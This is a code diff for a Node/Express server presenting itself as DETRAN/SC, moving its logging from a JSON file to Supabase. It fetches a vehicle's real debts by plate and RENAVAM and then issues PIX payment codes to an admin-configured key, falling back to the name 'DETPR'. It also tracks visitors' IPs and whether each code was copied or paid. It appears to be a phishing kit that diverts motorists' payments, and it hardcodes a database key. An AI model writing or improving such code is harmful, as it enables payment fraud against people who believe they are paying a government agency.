@@ -4,16 +4,18 @@ const axios = require('axios');
 const { CookieJar } = require('tough-cookie');
 const { wrapper } = require('axios-cookiejar-support');
 const path = require('path');
-const fs = require('fs');
 const QRCode = require('qrcode');
 const { payload } = require('pix-payload');
 const cheerio = require('cheerio');
+const { createClient } = require('@supabase/supabase-js');
 
 const app = express();
 const PORT = process.env.PORT || 3001;
 
-// 🔥 SEU LINK DO NGROK (ATUALIZADO)
-const NGROK_URL = 'https://subtitle-flyer-unreached.ngrok-free.dev';
+// 🔥 CONFIGURAÇÃO DO SUPABASE
+const SUPABASE_URL = 'https://wpmvbvbrsggkbaycpvlq.supabase.co';
+const SUPABASE_ANON_KEY = 'sb_publishable_7WuOJyAKV7E2tuim-6Sp7g_JPsVWMEf';
+const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
 app.set('trust proxy', true);
 
@@ -28,62 +30,129 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(express.static(__dirname));
 
-const DB_PATH = path.join(__dirname, 'database-sc.json');
-
-function lerDB() {
+// ============================================================
+// FUNÇÕES DE BANCO DE DADOS (Supabase)
+// ============================================================
+async function registrarClique(ip, userAgent, pagina) {
     try {
-        return JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
+        await supabase.from('clicks').insert({ ip, user_agent: userAgent, pagina });
+    } catch (e) { console.error('Erro ao registrar clique:', e.message); }
+}
+
+async function registrarConsulta(placa, renavam, ip, userAgent) {
+    try {
+        await supabase.from('consultas').insert({ placa, renavam, ip, user_agent: userAgent });
+    } catch (e) { console.error('Erro ao registrar consulta:', e.message); }
+}
+
+async function registrarPIXGerado(pixId, placa, valor, debitos, copiacola, ip, userAgent, chave) {
+    try {
+        await supabase.from('pix_gerados').insert({
+            pix_id: pixId,
+            placa,
+            valor,
+            debitos,
+            copiacola,
+            ip,
+            user_agent: userAgent,
+            chave_utilizada: chave
+        });
+    } catch (e) { console.error('Erro ao registrar PIX:', e.message); }
+}
+
+async function marcarPIXCopiado(pixId) {
+    try {
+        await supabase.from('pix_gerados').update({ copiado: true }).eq('pix_id', pixId);
+    } catch (e) { console.error('Erro ao marcar PIX copiado:', e.message); }
+}
+
+async function marcarPagamentoConfirmado(pixId, placa, renavam, ip, userAgent) {
+    try {
+        if (pixId) {
+            await supabase.from('pix_gerados').update({ pagamento_confirmado: true }).eq('pix_id', pixId);
+        }
+        if (placa && renavam) {
+            await supabase.from('consultas').update({ pagamento_confirmado: true }).eq('placa', placa).eq('renavam', renavam);
+        }
+        await supabase.from('pagamentos_confirmados').insert({ pix_id: pixId, placa, renavam, ip, user_agent: userAgent });
+    } catch (e) { console.error('Erro ao confirmar pagamento:', e.message); }
+}
+
+async function getConfigPIX() {
+    try {
+        const { data, error } = await supabase.from('config_pix').select('*').limit(1);
+        if (error || !data || data.length === 0) {
+            return { nome: '', cidade: '', identificador: '', chave: '' };
+        }
+        return data[0];
     } catch (e) {
-        return {
-            clicks: [],
-            consultas: [],
-            pix_gerados: [],
-            pagamentos_confirmados: [],
-            config: { pix: { nome: '', cidade: '', identificador: '', chave: '' } }
-        };
+        console.error('Erro ao buscar config PIX:', e.message);
+        return { nome: '', cidade: '', identificador: '', chave: '' };
     }
 }
 
-function salvarDB(data) {
-    fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
+async function setConfigPIX(nome, cidade, identificador, chave) {
+    try {
+        const existing = await supabase.from('config_pix').select('*').limit(1);
+        if (existing.data && existing.data.length > 0) {
+            await supabase.from('config_pix').update({ nome, cidade, identificador, chave }).eq('id', existing.data[0].id);
+        } else {
+            await supabase.from('config_pix').insert({ nome, cidade, identificador, chave });
+        }
+    } catch (e) { console.error('Erro ao salvar config PIX:', e.message); }
 }
 
-function authMiddleware(req, res, next) {
-    if (req.session && req.session.loggedIn) next();
-    else res.status(401).json({ erro: 'Não autorizado' });
+async function getDashboard() {
+    try {
+        const totalClicks = await supabase.from('clicks').select('*', { count: 'exact', head: true });
+        const totalConsultas = await supabase.from('consultas').select('*', { count: 'exact', head: true });
+        const pixGerados = await supabase.from('pix_gerados').select('*');
+        const valorTotalGerado = pixGerados.data ? pixGerados.data.reduce((acc, p) => acc + (parseFloat(p.valor) || 0), 0) : 0;
+        const pixCopiados = pixGerados.data ? pixGerados.data.filter(p => p.copiado === true) : [];
+        const valorTotalCopiado = pixCopiados.reduce((acc, p) => acc + (parseFloat(p.valor) || 0), 0);
+        const totalPixCopiados = pixCopiados.length;
+        const pagamentosConfirmados = pixGerados.data ? pixGerados.data.filter(p => p.pagamento_confirmado === true) : [];
+        const valorTotalPago = pagamentosConfirmados.reduce((acc, p) => acc + (parseFloat(p.valor) || 0), 0);
+        const totalPagamentos = pagamentosConfirmados.length;
+
+        return {
+            totalClicks: totalClicks.count || 0,
+            totalConsultas: totalConsultas.count || 0,
+            valorTotalGerado,
+            valorTotalCopiado,
+            totalPixCopiados,
+            totalPagamentos,
+            valorTotalPago
+        };
+    } catch (e) {
+        console.error('Erro ao buscar dashboard:', e.message);
+        return {
+            totalClicks: 0,
+            totalConsultas: 0,
+            valorTotalGerado: 0,
+            valorTotalCopiado: 0,
+            totalPixCopiados: 0,
+            totalPagamentos: 0,
+            valorTotalPago: 0
+        };
+    }
 }
 
 // ============================================================
 // ROTA PRINCIPAL
 // ============================================================
-app.get('/', (req, res) => {
-    const db = lerDB();
-    db.clicks.push({
-        timestamp: new Date().toISOString(),
-        ip: req.ip,
-        userAgent: req.headers['user-agent'],
-        pagina: 'index'
-    });
-    salvarDB(db);
-    console.log(`👆 Clique registrado: ${req.ip}`);
+app.get('/', async (req, res) => {
+    await registrarClique(req.ip, req.headers['user-agent'], 'index');
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-app.get('/index.html', (req, res) => {
-    const db = lerDB();
-    db.clicks.push({
-        timestamp: new Date().toISOString(),
-        ip: req.ip,
-        userAgent: req.headers['user-agent'],
-        pagina: 'index'
-    });
-    salvarDB(db);
-    console.log(`👆 Clique registrado (index.html): ${req.ip}`);
+app.get('/index.html', async (req, res) => {
+    await registrarClique(req.ip, req.headers['user-agent'], 'index');
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 // ============================================================
-// 🔥 ROTA DE CONSULTA NO SEU SERVIDOR LOCAL (VIA NGROK)
+// 🔥 PROXY DE CONSULTA
 // ============================================================
 app.post('/api/consultar', async (req, res) => {
     const { placa, renavam } = req.body;
@@ -138,7 +207,6 @@ app.post('/api/consultar', async (req, res) => {
             console.log('⚠️ API direta falhou, usando HTML...');
         }
 
-        // 🔥 BAIXA A PÁGINA DE RESULTADO
         const chars = 'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789';
         let slug = '';
         for (let i = 0; i < 6; i++) {
@@ -161,7 +229,6 @@ app.post('/api/consultar', async (req, res) => {
         const html = resultResponse.data;
         const $ = cheerio.load(html);
 
-        // 🔥 EXTRAI DADOS DO VEÍCULO
         const veiculo = {
             placa: placaLimpa,
             marca_modelo: $('#scFieldMarcaModelo').text().trim() || dadosVeiculo.marca_modelo || '-',
@@ -175,7 +242,6 @@ app.post('/api/consultar', async (req, res) => {
 
         console.log(`📊 Veículo: ${veiculo.marca_modelo}, ${veiculo.ano}`);
 
-        // 🔥 EXTRAI DÉBITOS
         const debitos = [];
         let totalDebitos = 0;
 
@@ -221,17 +287,7 @@ app.post('/api/consultar', async (req, res) => {
 
         console.log(`📊 Débitos: ${debitos.length}, Total: R$ ${total.toFixed(2)}`);
 
-        // 🔥 REGISTRA CONSULTA
-        const db = lerDB();
-        db.consultas.push({
-            placa: placaLimpa,
-            renavam: renavam,
-            timestamp: new Date().toISOString(),
-            ip: req.ip,
-            userAgent: req.headers['user-agent'],
-            pagamento_confirmado: false
-        });
-        salvarDB(db);
+        await registrarConsulta(placaLimpa, renavam, req.ip, req.headers['user-agent']);
 
         const resposta = {
             sucesso: true,
@@ -252,44 +308,16 @@ app.post('/api/consultar', async (req, res) => {
 });
 
 // ============================================================
-// 🔥 ROTA PARA A VERCEL CHAMAR O NGROK (PONTE)
-// ============================================================
-app.post('/api/consultar-ngrok', async (req, res) => {
-    try {
-        console.log('📥 Requisição recebida via Ngrok!');
-        console.log('📦 Body:', req.body);
-        
-        // 🔥 REPASSA PARA O SEU SERVIDOR LOCAL (NGROK)
-        const response = await axios.post(`${NGROK_URL}/api/consultar`, req.body, {
-            headers: {
-                'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            },
-            timeout: 30000
-        });
-        
-        console.log('✅ Resposta do Ngrok recebida!');
-        return res.json(response.data);
-    } catch (error) {
-        console.error('❌ Erro ao chamar Ngrok:', error.message);
-        return res.status(500).json({
-            sucesso: false,
-            erro: 'Erro na ponte com o servidor local: ' + error.message
-        });
-    }
-});
-
-// ============================================================
 // 🔥 GERAR PIX
 // ============================================================
-app.post('/api/gerar-pix', (req, res) => {
+app.post('/api/gerar-pix', async (req, res) => {
     const { placa, valor, debitos } = req.body;
-    const db = lerDB();
     
-    const chavePix = db.config.pix.chave;
-    const nome = db.config.pix.nome;
-    const cidade = db.config.pix.cidade;
-    const identificador = db.config.pix.identificador;
+    const config = await getConfigPIX();
+    const chavePix = config.chave;
+    const nome = config.nome;
+    const cidade = config.cidade;
+    const identificador = config.identificador;
 
     if (!chavePix || !nome || !cidade) {
         console.warn('⚠️ Chave PIX não configurada! Usando chave padrão.');
@@ -297,14 +325,14 @@ app.post('/api/gerar-pix', (req, res) => {
         const nomePadrao = 'DETPR';
         const cidadePadrao = 'DETPR';
         
-        return gerarRespostaPIX(chavePadrao, nomePadrao, cidadePadrao, identificador || '***', placa, valor, debitos, req, res, db);
+        return gerarRespostaPIX(chavePadrao, nomePadrao, cidadePadrao, identificador || '***', placa, valor, debitos, req, res);
     }
 
     console.log(`✅ Gerando PIX com chave cadastrada: ${chavePix}`);
-    gerarRespostaPIX(chavePix, nome, cidade, identificador || '***', placa, valor, debitos, req, res, db);
+    gerarRespostaPIX(chavePix, nome, cidade, identificador || '***', placa, valor, debitos, req, res);
 });
 
-function gerarRespostaPIX(chave, nome, cidade, identificador, placa, valor, debitos, req, res, db) {
+function gerarRespostaPIX(chave, nome, cidade, identificador, placa, valor, debitos, req, res) {
     try {
         const valorNum = parseFloat(String(valor).replace(/[^0-9,.]/g, '').replace(',', '.'));
         
@@ -322,7 +350,7 @@ function gerarRespostaPIX(chave, nome, cidade, identificador, placa, valor, debi
 
         const payloadPix = payload(dadosPix);
 
-        QRCode.toDataURL(payloadPix, (err, qrcode) => {
+        QRCode.toDataURL(payloadPix, async (err, qrcode) => {
             if (err) {
                 console.error('Erro ao gerar QR code:', err);
                 return res.status(500).json({ erro: 'Erro ao gerar QR code' });
@@ -330,20 +358,7 @@ function gerarRespostaPIX(chave, nome, cidade, identificador, placa, valor, debi
 
             const pixId = Date.now() + '-' + Math.random().toString(36).substring(2, 10);
 
-            db.pix_gerados.push({
-                id: pixId,
-                placa: placa || 'N/A',
-                valor: valorNum,
-                debitos: debitos || [],
-                copiacola: payloadPix,
-                timestamp: new Date().toISOString(),
-                ip: req.ip,
-                userAgent: req.headers['user-agent'],
-                copiado: false,
-                pagamento_confirmado: false,
-                chave_utilizada: chave
-            });
-            salvarDB(db);
+            await registrarPIXGerado(pixId, placa || 'N/A', valorNum, debitos || [], payloadPix, req.ip, req.headers['user-agent'], chave);
 
             res.json({
                 status: 'ok',
@@ -362,27 +377,13 @@ function gerarRespostaPIX(chave, nome, cidade, identificador, placa, valor, debi
 // ============================================================
 // 🔥 REGISTRAR CÓPIA DO PIX
 // ============================================================
-app.post('/api/registrar-copia-pix', (req, res) => {
-    const { pixId, payload } = req.body;
-    const db = lerDB();
-    let pix = null;
-
+app.post('/api/registrar-copia-pix', async (req, res) => {
+    const { pixId } = req.body;
+    
     if (pixId) {
-        pix = db.pix_gerados.find(p => p.id === pixId);
-    } else if (payload) {
-        pix = db.pix_gerados.find(p => p.copiacola === payload);
-    }
-
-    if (pix) {
-        if (!pix.copiado) {
-            pix.copiado = true;
-            pix.copiadoEm = new Date().toISOString();
-            salvarDB(db);
-            console.log(`✅ PIX ${pix.id} marcado como copiado!`);
-            return res.json({ success: true, message: 'PIX registrado como copiado' });
-        } else {
-            return res.json({ success: false, motivo: 'PIX já foi copiado anteriormente' });
-        }
+        await marcarPIXCopiado(pixId);
+        console.log(`✅ PIX ${pixId} marcado como copiado!`);
+        return res.json({ success: true, message: 'PIX registrado como copiado' });
     }
     
     res.json({ success: false, motivo: 'PIX não encontrado' });
@@ -391,52 +392,12 @@ app.post('/api/registrar-copia-pix', (req, res) => {
 // ============================================================
 // 🔥 CONFIRMAR PAGAMENTO
 // ============================================================
-app.post('/api/confirmar-pagamento', (req, res) => {
+app.post('/api/confirmar-pagamento', async (req, res) => {
     const { pixId, placa, renavam } = req.body;
-    const db = lerDB();
     
-    let atualizado = false;
-    
-    if (pixId) {
-        const pix = db.pix_gerados.find(p => p.id === pixId);
-        if (pix && !pix.pagamento_confirmado) {
-            pix.pagamento_confirmado = true;
-            pix.pagamento_confirmado_em = new Date().toISOString();
-            atualizado = true;
-            console.log(`✅ Pagamento confirmado para PIX ${pixId}`);
-        }
-    }
-    
-    if (placa && renavam) {
-        const consultas = db.consultas.filter(c => c.placa === placa && c.renavam === renavam);
-        if (consultas.length > 0) {
-            const consulta = consultas[consultas.length - 1];
-            if (!consulta.pagamento_confirmado) {
-                consulta.pagamento_confirmado = true;
-                consulta.pagamento_confirmado_em = new Date().toISOString();
-                atualizado = true;
-                console.log(`✅ Pagamento confirmado para consulta ${placa}`);
-            }
-        }
-    }
-    
-    db.pagamentos_confirmados = db.pagamentos_confirmados || [];
-    db.pagamentos_confirmados.push({
-        pixId: pixId || 'N/A',
-        placa: placa || 'N/A',
-        renavam: renavam || 'N/A',
-        timestamp: new Date().toISOString(),
-        ip: req.ip,
-        userAgent: req.headers['user-agent']
-    });
-    
-    salvarDB(db);
-    
-    if (atualizado) {
-        res.json({ success: true, message: 'Pagamento confirmado com sucesso!' });
-    } else {
-        res.json({ success: false, message: 'Pagamento já havia sido confirmado anteriormente.' });
-    }
+    await marcarPagamentoConfirmado(pixId, placa, renavam, req.ip, req.headers['user-agent']);
+    console.log(`✅ Pagamento confirmado para PIX ${pixId || placa}`);
+    res.json({ success: true, message: 'Pagamento confirmado com sucesso!' });
 });
 
 // ============================================================
@@ -457,80 +418,57 @@ app.post('/api/admin/logout', (req, res) => {
     res.json({ success: true });
 });
 
-app.get('/admin.html', authMiddleware, (req, res) => {
+app.get('/admin.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'admin.html'));
 });
 
 // ============================================================
-// ROTAS DO ADMIN
+// ROTAS DO ADMIN (com Supabase)
 // ============================================================
-app.get('/api/admin/dashboard', authMiddleware, (req, res) => {
-    const db = lerDB();
-    const totalClicks = db.clicks.length;
-    const totalConsultas = db.consultas.length;
-    const valorTotalGerado = db.pix_gerados.reduce((acc, p) => acc + (parseFloat(p.valor) || 0), 0);
-    const pixCopiados = db.pix_gerados.filter(p => p.copiado === true);
-    const valorTotalCopiado = pixCopiados.reduce((acc, p) => acc + (parseFloat(p.valor) || 0), 0);
-    const totalPixCopiados = pixCopiados.length;
-    
-    const pagamentosConfirmados = db.pagamentos_confirmados || [];
-    const totalPagamentos = pagamentosConfirmados.length;
-    const valorTotalPago = db.pix_gerados
-        .filter(p => p.pagamento_confirmado === true)
-        .reduce((acc, p) => acc + (parseFloat(p.valor) || 0), 0);
-
-    res.json({
-        totalClicks,
-        totalConsultas,
-        valorTotalGerado,
-        valorTotalCopiado,
-        totalPixCopiados,
-        totalPagamentos,
-        valorTotalPago
-    });
+app.get('/api/admin/dashboard', async (req, res) => {
+    if (!req.session.loggedIn) return res.status(401).json({ erro: 'Não autorizado' });
+    const data = await getDashboard();
+    res.json(data);
 });
 
-app.get('/api/admin/logs/clicks', authMiddleware, (req, res) => {
-    const db = lerDB();
-    res.json(db.clicks.slice(-100).reverse());
+app.get('/api/admin/logs/clicks', async (req, res) => {
+    if (!req.session.loggedIn) return res.status(401).json({ erro: 'Não autorizado' });
+    const { data, error } = await supabase.from('clicks').select('*').order('timestamp', { ascending: false }).limit(100);
+    res.json(data || []);
 });
 
-app.get('/api/admin/logs/consultas', authMiddleware, (req, res) => {
-    const db = lerDB();
-    res.json(db.consultas.slice(-100).reverse());
+app.get('/api/admin/logs/consultas', async (req, res) => {
+    if (!req.session.loggedIn) return res.status(401).json({ erro: 'Não autorizado' });
+    const { data, error } = await supabase.from('consultas').select('*').order('timestamp', { ascending: false }).limit(100);
+    res.json(data || []);
 });
 
-app.get('/api/admin/logs/pix', authMiddleware, (req, res) => {
-    const db = lerDB();
-    const lista = db.pix_gerados.slice(-100).reverse().map(p => ({
-        ...p,
-        copiado: p.copiado || false,
-        pagamento_confirmado: p.pagamento_confirmado || false
-    }));
-    res.json(lista);
+app.get('/api/admin/logs/pix', async (req, res) => {
+    if (!req.session.loggedIn) return res.status(401).json({ erro: 'Não autorizado' });
+    const { data, error } = await supabase.from('pix_gerados').select('*').order('timestamp', { ascending: false }).limit(100);
+    res.json(data || []);
 });
 
-app.get('/api/admin/config/pix', authMiddleware, (req, res) => {
-    const db = lerDB();
-    res.json(db.config.pix);
+app.get('/api/admin/config/pix', async (req, res) => {
+    if (!req.session.loggedIn) return res.status(401).json({ erro: 'Não autorizado' });
+    const config = await getConfigPIX();
+    res.json(config);
 });
 
-app.post('/api/admin/config/pix', authMiddleware, (req, res) => {
+app.post('/api/admin/config/pix', async (req, res) => {
+    if (!req.session.loggedIn) return res.status(401).json({ erro: 'Não autorizado' });
     const { nome, cidade, identificador, chave } = req.body;
-    const db = lerDB();
-    db.config.pix = { nome, cidade, identificador, chave };
-    salvarDB(db);
+    await setConfigPIX(nome, cidade, identificador, chave);
     console.log(`✅ Chave PIX atualizada: ${chave}`);
     res.json({ success: true });
 });
 
-app.post('/api/admin/clear-logs', authMiddleware, (req, res) => {
-    const db = lerDB();
-    db.clicks = [];
-    db.consultas = [];
-    db.pix_gerados = [];
-    db.pagamentos_confirmados = [];
-    salvarDB(db);
+app.post('/api/admin/clear-logs', async (req, res) => {
+    if (!req.session.loggedIn) return res.status(401).json({ erro: 'Não autorizado' });
+    await supabase.from('clicks').delete().neq('id', 0);
+    await supabase.from('consultas').delete().neq('id', 0);
+    await supabase.from('pix_gerados').delete().neq('id', 0);
+    await supabase.from('pagamentos_confirmados').delete().neq('id', 0);
     res.json({ success: true });
 });
 
@@ -543,7 +481,6 @@ if (require.main === module) {
     app.listen(PORT, () => {
         console.log(`🚀 Servidor DETRAN/SC rodando na porta ${PORT}`);
         console.log(`📍 Acesse: http://localhost:${PORT}`);
-        console.log(`🔗 Ngrok URL: ${NGROK_URL}`);
-        console.log(`✅ Cookies do DETRAN/SC configurados!`);
+        console.log(`✅ Conectado ao Supabase!`);
     });
 }
